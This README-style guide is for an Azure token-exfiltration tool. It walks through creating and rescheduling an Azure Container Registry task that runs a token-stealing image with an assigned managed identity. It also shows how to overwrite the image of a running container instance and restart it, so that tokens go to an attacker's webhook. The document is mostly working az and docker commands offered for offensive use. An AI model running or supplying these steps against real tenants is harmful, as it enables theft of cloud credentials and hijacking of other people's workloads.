This one is built for mf azure container registry. (you gotta modify the entrypoint in this repo with your webhook)

Deploy
```bash
az acr task create \
    --registry <your-registry-name> \
    --name exfil-token-task \
    --image exfil/token:v1 \
    --context https://github.com/Jacob-Ham/aztokenexfil-noenv.git \
    --file Dockerfile \
    --assign-identity \
    --commit-trigger-enabled false \
    --schedule "*/1 * * * *"
```
Build image
```bash
az acr task run --registry <your-registry-name> --name exfil-token-task
```
Update run context to execute image on next run task
```bash
az acr task update \
    --registry <registryname> \
    --name exfil-token-task \
    --context /dev/null \
    --cmd "<registryname>.azurecr.io/exfil/token:v1"
```
Actually execute image
```bash
az acr task run --registry <your-registry-name> --name exfil-token-task
```

OR with Microsoft.ContainerRegistry/registries/push/write & Microsoft.ContainerInstance/containerGroups/restart/action
```bash
az container show \
  --resource-group <RG>\
  --name <containername> \
  --query "containers[0].image"
```
Build this image to match name of already running one.
```bash
docker build -t <registryname>.azurecr.io/<image>:latest .
```
Login, push to registry, and restart
```bash
az acr login --name <registry>
docker push <registryname>.azurecr.io/<image>:latest
az container restart --resource-group <RG> --name <containername>
```
check webhook



